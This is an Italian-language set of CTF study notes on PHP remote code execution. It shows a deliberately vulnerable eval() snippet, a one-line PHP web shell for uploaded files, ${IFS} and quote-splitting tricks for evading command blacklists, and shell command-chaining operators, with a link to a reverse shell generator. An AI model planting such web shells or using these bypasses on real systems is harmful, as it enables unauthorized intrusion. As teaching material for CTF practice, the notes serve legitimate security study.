# RCE
Vulnerabilità (critica) che permette di eseguire codice arbitrario su un dispositivo da remoto.
Un classico esempio di codice che porta a RCE, in PHP, è: 
```
<?php $code = $_GET['code'];
eval($code); ?>
```
Possiamo quindi eseguire del codice tramite il prametro 'code': 
```
http://host/page.php?code=phpinfo();
```
# REVERSE SHELL
Assumento che si possa anche caricare un file che venga poi eseguito è possibile inserire nel file il seguente payload:

(Vedi [https://www.revshells.com/](https://www.revshells.com/) per payload di reverse shell)

```
<?php echo shell_exec($_GET['cmd']); ?>
```
Che ci permette, una volta che ci siamo posizionati sul file che abbiamo caricato, di eseguire dei comandi arbitrari tramite il parametro ```?cmd=phpinfo()```

Nelle CTF può capitare che ,al posto di sanificare l'input, venga proposta una blacklist per cercare di evitare un certo tipo di attacco. Questo è generalmente sbagliato e ci sono vari modi per bypassare questi controlli. 

# BYPASS DELLO SPAZIO
Uno dei bypass più comuni da effettuare è quello del blocco di spazi nei comandi che si vogliono eseguire, generlamente ```${IFS} e $IFS``` ci permettono di rappresentare lo spazio nella maggior parte delle shell.

Tenete sempre conto del fatto che passare il payload nell'url può dare problemi per via dell'URL Encode(in certi casi permette di effettuare dei bypass) e che molte informazioni possono essere rappresentate in Base64.

Come già detto cercate di capire il sistema che avete davanti e siate creativi, a volte basta un po' di creatività per ottenere la flag, per esempio con payload del tipo: 
```
w'h'o'am'i
wh''oami
```
# CONCATENARE COMANDI
Tecniche che permettono di concatenare più comandi (queste sono per RCE in sistemi Unix): 
```
; 
&& (AND)
|| (OR)
& (Background)
| (Pipe): Prende l'output del primo comando e lo usa come input del secondo
```
```
command1; command2   # Execute command1 and then command2
command1 && command2 # Execute command2 only if command1 succeeds
command1 || command2 # Execute command2 only if command1 fails
command1 & command2  # Execute command1 in the background
command1 | command2  # Pipe the output of command1 into command2
```
Inoltre ricordatevi che i commenti sono vostri amici, può esservi utile commentare quello che non vi serve in una determinata parte di codice.
